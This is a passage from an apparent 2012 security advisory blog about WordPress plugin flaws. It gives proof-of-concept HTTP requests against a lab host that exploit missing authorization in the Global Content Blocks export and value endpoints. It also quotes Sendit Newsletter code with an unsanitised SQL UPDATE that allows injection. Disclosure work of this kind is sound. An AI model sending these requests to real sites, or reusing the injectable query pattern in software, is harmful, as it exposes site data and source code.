			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/global-content-blocks/resources/tinymce/gcbvalue.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

id=1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69aae568702099-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69aae568702099-2">2</div><div class="crayon-num" data-line="crayon-53c9878a69aae568702099-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69aae568702099-4">4</div><div class="crayon-num" data-line="crayon-53c9878a69aae568702099-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69aae568702099-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69aae568702099-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">resources</span><span class="crayon-o">/</span><span class="crayon-i">tinymce</span><span class="crayon-o">/</span><span class="crayon-v">gcbvalue</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69aae568702099-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a69aae568702099-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69aae568702099-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line" id="crayon-53c9878a69aae568702099-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69aae568702099-6"><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p>This will disclose the contents of the block, which may contain PHP code that may contain secrets.</p>
<p>Analysis of gcb_export.php vulnerability<br />
A feature that the admin panel of this plugin is that it will export the block defined for easy import into another blog. It does so by calling <a href="http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/gcb/gcb_export.php">/gcb/gcb_export.php</a>, which forces the browser to download a .gcb file which contains base64 encoded content.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69ab6010069852" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(!isset($_GET["gcb"])) (die("Please select some values"));
require_once('../../../../wp-load.php');
global $wpdb;

$ids = explode(";",$_GET["gcb"]);
$final_text = array();

foreach($ids as $id) {
    if(intval($id)&gt;0) {
        $entry = $wpdb-&gt;get_row("select * from ".$wpdb-&gt;prefix."gcb where id=".intval(mysql_real_escape_string($id)));
        $final_text[] =
        base64_encode($entry-&gt;name)."".
        base64_encode($entry-&gt;description)."".
        base64_encode($entry-&gt;value)."".
        base64_encode($entry-&gt;type);        
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-2">2</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-4">4</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-6">6</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-8">8</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-10">10</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-12">12</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-14">14</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ab6010069852-16">16</div><div class="crayon-num" data-line="crayon-53c9878a69ab6010069852-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69ab6010069852-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"gcb"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Please select some values"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-2"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-3"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-4">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-5"><span class="crayon-sy">$</span><span class="crayon-v">ids</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">";"</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"gcb"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-6"><span class="crayon-sy">$</span><span class="crayon-v">final_text</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-8"><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">ids </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-o">&gt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">entry</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"select * from "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gcb where id="</span><span class="crayon-sy">.</span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">final_text</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">description</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">""</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">base64_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">entry</span><span class="crayon-o">-&gt;</span><span class="crayon-i">type</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ab6010069852-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a69ab6010069852-17"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0057 seconds] -->
<p>Again there is a lack of validation that the user is logged in and has sufficient privileges to view this data normally. And because it may contain php code that is sensitive, it offers a source code disclosure vulnerability we can exploit like this. Note the semi-colon separated id list, which makes this very handy.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69ac0677972037" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/global-content-blocks/gcb/gcb_export.php?gcb=1;2;3 HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69ac0677972037-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69ac0677972037-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69ac0677972037-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">gcb</span><span class="crayon-o">/</span><span class="crayon-v">gcb_export</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">gcb</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span><span class="crayon-cn">2</span><span class="crayon-sy">;</span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69ac0677972037-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0017 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/global-content-blocks/" rel="tag">Global Content Blocks</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/#respond" title="Comment on WordPress Global Content Blocks multiple vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-37 -->

				
					
<article id="post-43" class="post-43 post type-post status-publish format-standard hentry category-advisories tag-sendit-newsletter tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/" title="11:42 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-10T23:42:47+00:00" pubdate>July 10, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/07/10/wordpress-sendit-newsletter-plugin-multiple-sql-injection/" title="Permalink to WordPress Sendit Newsletter plugin multiple SQL injection" rel="bookmark">WordPress Sendit Newsletter plugin multiple SQL injection</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49506/">Secunia Advisory SA 49506</a></p>
<p><strong>Analysis</strong><br />
A SQL injection vulnerability exists in the <a href="http://plugins.svn.wordpress.org/sendit/tags/2.1.0/ajax.php">ajax.php</a> file of the Sendit Newsletter plugin for WordPress, which is used for setting the subscribed or unsubscribed flag on an email.</p>
<p>By passing in an arbitrary key-pair value, we see that because of line 9, it will use the key-pair for the SET statement on line 17/27 without any validation. It will also explode(Split into an array) the ID value on line 10 and 11 and put the &#8220;ID&#8221; into a variable later used, without validating that it is an integer. This is then also used on line 17/27, and is also exploitable.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a6a2cb198219117" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
include("../../../wp-blog-header.php");
status_header(200);
nocache_headers();
require_once 'libs/actions.php';
global $wpdb;
//print_r($_POST);
//let me parse
foreach($_POST as $k=&gt;$v):
    $id= explode("-", $_POST['id']);
    $id=$id[1];

    if($k!='id'):
        if($k!='email'):
            //serializer update
            $subscriber_info=json_encode($_POST);
            $update=$wpdb-&gt;query("update ".SENDIT_EMAIL_TABLE." set $k = '$v' where id_email = $id");     
            //$update="update ".SENDIT_EMAIL_TABLE." set subscriber_info = '$subscriber_info' where id_email = $id";
            if($v=='y') { $confirmed='confirmed'; $style='vertical-align:middle; background:#E4FFCF;'; } 
            elseif($v=='d') {$confirmed='unsubscribed'; $style='vertical-align:middle; background:#fd919b';} 
            elseif($v=='n') {$confirmed='not confirmed'; $style='vertical-align:middle; background:#fffbcc;';} 
            else {}
            echo '&lt;div style="'.$style.'display:block;height:35px"&gt;';
                echo $confirmed;
            echo '&lt;/div&gt;';
        else:   
            $update=$wpdb-&gt;query("update ".SENDIT_EMAIL_TABLE." set $k = '$v' where id_email = $id");

            echo $v;
        endif;
    endif;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-2">2</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-4">4</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-6">6</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-8">8</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-10">10</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-12">12</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-14">14</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-16">16</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-18">18</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-20">20</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-22">22</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-24">24</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-26">26</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-28">28</div><div class="crayon-num" data-line="crayon-53c9878a6a2cb198219117-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6a2cb198219117-30">30</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-1"><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-s">"../../../wp-blog-header.php"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-2"><span class="crayon-e">status_header</span><span class="crayon-sy">(</span><span class="crayon-cn">200</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-3"><span class="crayon-e">nocache_headers</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-4"><span class="crayon-i">require_once</span><span class="crayon-h"> </span><span class="crayon-s">'libs/actions.php'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-5"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-6"><span class="crayon-c">//print_r($_POST);</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-7"><span class="crayon-c">//let me parse</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-8"><span class="crayon-st">foreach</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e">_POST </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">k</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">v</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"-"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">k</span><span class="crayon-o">!=</span><span class="crayon-s">'id'</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">k</span><span class="crayon-o">!=</span><span class="crayon-s">'email'</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6a2cb198219117-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//serializer update</span></div><div class="crayon-line" id="crayon-53c9878a6a2cb198219117-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span 